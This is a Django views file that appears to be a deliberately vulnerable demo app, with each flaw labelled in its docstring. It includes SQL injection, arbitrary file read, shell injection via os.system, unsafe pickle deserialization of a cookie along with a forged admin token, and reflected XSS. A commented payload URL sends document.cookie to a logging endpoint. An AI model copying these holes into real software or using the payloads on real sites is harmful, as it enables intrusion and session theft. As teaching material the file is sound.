import json
import os
import pickle
from dataclasses import dataclass
import base64

from django.http import HttpResponse, JsonResponse
from django.utils.safestring import mark_safe

from security.models import User


def unsafe_users(request, user_id):
    """SQL injection"""

    users = User.objects.raw(f'SELECT * FROM security_user WHERE id = {user_id}')

    return HttpResponse(users)


def safe_users(request, user_id):
    """Uses parameterised query so it's fine"""

    users = User.objects.raw('SELECT * FROM security_user WHERE id = %s', (user_id,))

    return HttpResponse(users)


def read_file(request, filename):
    with open(filename) as f:
        return HttpResponse(f.read())


def copy_file(request, filename):
    """Copy a file in a very dangerous way"""

    cmd = f'cp {filename} new_{filename}'

    os.system(cmd)

    return HttpResponse("All good, don't worry about a thing :>")


@dataclass
class TestUser:
    """Dummy user data"""

    perms: int = 0


pickled_user = pickle.dumps(TestUser())
print(pickled_user)
encoded_user = base64.b64encode(pickled_user)
print(encoded_user)


# No access token:
# b'\x80\x03csecurity.views\nTestUser\nq\x00)\x81q\x01}q\x02X\x05\x00\x00\x00permsq\x03K\x00sb.'
# b'gANjc2VjdXJpdHkudmlld3MKVGVzdFVzZXIKcQApgXEBfXECWAUAAABwZXJtc3EDSwBzYi4='


# Admin token:
# b'\x80\x03csecurity.views\nTestUser\nq\x00)\x81q\x01}q\x02X\x05\x00\x00\x00permsq\x03K\x01sb.'
# b'gANjc2VjdXJpdHkudmlld3MKVGVzdFVzZXIKcQApgXEBfXECWAUAAABwZXJtc3EDSwFzYi4='

def admin_index(request):
    """Protected admin page which can be broken into by manipulating a token"""

    token = base64.b64decode(request.COOKIES.get('silly_token', ''))
    user = pickle.loads(token)

    if user.perms == 1:
        return HttpResponse('Hello Admin')

    return HttpResponse('No access')


# http://127.0.0.1:8000/security/search?query=%3Cscript%3Enew%20Image().src=%22http://127.0.0.1:8000/security/log?string=%22.concat(document.cookie)%3C/script%3E
def search(request):
    """Search functionality prone to XSS"""

    query = request.GET.get('query', '')

    response = HttpResponse(f"Query: {query}")

    # Override browser's protection, if exsits
    response['X-XSS-Protection'] = 0

    return response

def log(request):
    """Just print whatever was received"""
    string = request.GET.get('string', '')

    print(string)

    return HttpResponse()
